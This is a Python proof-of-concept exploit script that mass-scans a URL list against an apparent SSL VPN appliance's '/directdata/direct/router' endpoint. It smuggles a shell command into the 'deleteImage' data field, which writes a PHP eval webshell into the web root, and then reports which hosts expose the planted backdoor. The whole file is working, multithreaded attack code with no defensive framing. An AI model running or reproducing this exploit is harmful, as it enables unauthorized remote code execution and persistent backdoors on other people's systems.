# coding=UTF-8

import requests
import sys
import getopt
import math
import threading

requests.packages.urllib3.disable_warnings()

payload = "/directdata/direct/router" 

poc = "o9isu852j1.php"

webshell = "<?php @eval($_POST[xss]); ?>"

payload_data = """ {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '%s' >/var/www/html/o9isu852j1.php"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="} """ % webshell

headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4388.124 Safari/527.36'
        }  
#def usage():
#    print("python3 poc.py -t threads -u urls.txt")

def start():
    if len(sys.argv) == 5 :
        opts, args = getopt.getopt(sys.argv[1:], "t:u:")
        for k,v in opts:
            if k == "-t":
                threads = v
            elif k == "-u":
                dic = v
        m_scan(payload,threads,dic)
    else:
        print("python3 poc.py -t threads -u urls.txt")
        

def m_scan(payload,threads,dic):
    result_list = []
    threads_list= []
    with open (dic,"r") as f:
        dic_list = f.readlines()
           

        if len(dic_list) % int(threads) == 0:
            threads_read_line_num = len(dic_list) / int(threads)
        else:
            threads_read_line_num = math.ceil(len(dic_list) / int(threads))
        
        i=0
        temp_list = []
        for line in dic_list:
            i=i+1
            if i % threads_read_line_num == 0:
                temp_list.append(line.strip())
                result_list.append(temp_list)
                temp_list = []
            else:
                temp_list.append(line.strip())
    
    for i in result_list:
        threads_list.append(threading.Thread(target=scan, args=(payload,i)))   
    for t in threads_list:
        t.start()


def scan(payload,dic):
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            pass
        else:
            url_list = 'http://'+url_list
        try:
            r_res = requests.post(url_list+'/'+payload, data=payload_data, headers=headers,verify=False)
            r_exp = requests.get(url_list+'/'+poc,headers=headers,verify=False)
            if r_exp.status_code == 200:
                print(url_list+"/"+poc+" | xss")
            else:
                print(url_list+"  上传失败")

            
        except:
            pass

    


if __name__ =="__main__":
    start()
     
       
